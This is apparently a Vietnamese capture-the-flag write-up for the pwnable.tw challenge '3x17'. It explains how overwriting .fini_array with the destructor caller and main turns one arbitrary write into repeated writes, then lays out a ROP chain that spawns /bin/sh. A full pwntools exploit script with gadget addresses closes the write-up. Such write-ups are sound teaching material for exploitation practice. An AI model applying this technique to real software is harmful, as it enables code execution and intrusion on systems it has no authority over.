# 3x17 (pwnable.tw)

# Mở đầu
Theo mình thì đây là một chall không khó, nhưng khá hay do sử dụng một kĩ thuật khá mới lạ  
## Technology and content
**Tech**: chúng ta cần chú ý đến 2 phân vùng : *.init_array* và *.fini_array*  
* init_array: cung cấp các hàm contructor cho chương trình trước khi hàm main() được thực hiện  
* fini_array: cung cấp các hàm destructor cần thiết sau khi kết thúc hàm main(), trước khi kết thúc chương trình  
fini_array bao gồm 2 entry:
* foo_destructor :  chính là hàm gọi destructor  
* do_global_dtors_aux : hàm nãy sẽ chạy tất cả các global destructor(trên hệ thống) để thoát khỏi chương trình, trong trường hợp phân vùng *.fini_array* không được định nghĩa.       
* Hai hàm này được gọi theo thứ tự: gọi foo_destructor trước, sau đó đến do_global_dtors_aux    
**Cấu trúc của fini_array như sau:**      
 
![fini.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1624785316851/bqQBPZdnH.png)

Tham khảo ở link sau :  [This](http://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-v.html)  
**Content**
Chính nhờ những kiến thức bên trên, thì ta sẽ có cách solve chall này như sau:  
* ghi đè địa chỉ của .fini_array = địa chỉ của foo_destructor và địa chỉ của main  => khi chạy hết main, chương trình sẽ nhảy vào foo_destructor sau đó quay lại main => chúng ta có thể ghi đi ghi lại nhiều lần tuỳ ý  
* build stack bằng ROP  

## Analysic code
Binary của bài này đã được tác giả STRIPED cẩn thận, nên với một thằng gà RE như tôi thì việc hiểu flow khá khó khăn.  
Lần theo hàm _start thì chúng ta sẽ tìm được code của chương trình như sau  

![code.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1624785328918/FdIBWYyjX.png)

Về cơ bản thì chall này cho phép chúng ta ghi vào một địa chỉ bất kì.  
Theo content ở trên, ta xác định được hai địa chỉ:
* .fini_array : 0x4b40f0
* foo_destructor: 0x402960  

![fini_array.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1624785339483/ml8Hg1s0q.png)
 

Vậy hướng giải ta có như sau:  
* ghi đè địa chỉ của .fini_array = foo_destructor + main_address : để ghi đi ghi lại chương trình nhiều lần, sau khi chạy hết main sẽ nhảy vào foo_destructor và sau đó nhảy lại vào main  
* Build stack bằng ROP như sau:  

![stack.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1624785348063/upDs90rnS.png)
 
* sau khi build xong stack, ta sẽ ghi đè .fini_array lần cuối bằng leave_ret để nhảy vào ROP

## full code exploit
```python
from pwn import *
conn = process('./3x17')
# conn = remote('chall.pwnable.tw', 10105)

def write_to_add(addr, data):
    conn.recvuntil('addr:')
    input('?')
    conn.sendline(str(addr))
    conn.recvuntil('data:')
    conn.send(data)

_fini_array_addr = 0x4b40f0
_fini_array_caller = 0x402960
_main_addr = 0x401b6d
leave_ret = 0x401c4b
syscall = 0x4022b4
pop_rdi = 0x401696
pop_rsi = 0x406c30
pop_rax = 0x41e4af
pop_rdx = 0x446e35
bin_sh = _fini_array_addr + 88
write_to_add(_fini_array_addr, p64(_fini_array_caller) + p64(_main_addr)) #overwrite _fini_array with caller
# _main_address is the ret func off _fini_array_caller
input('?')
write_to_add(_fini_array_addr + 16, p64(pop_rdx) + p64(0))
write_to_add(_fini_array_addr + 32, p64(pop_rsi) + p64(0))
write_to_add(_fini_array_addr + 48, p64(pop_rax) + p64(0x3b))
write_to_add(_fini_array_addr + 64, p64(pop_rdi) + p64(bin_sh))
write_to_add(_fini_array_addr + 80, p64(syscall) + b'/bin/sh\x00')
write_to_add(_fini_array_addr, p64(leave_ret))
conn.interactive()
```
***Thanks for reading!!!!!!***

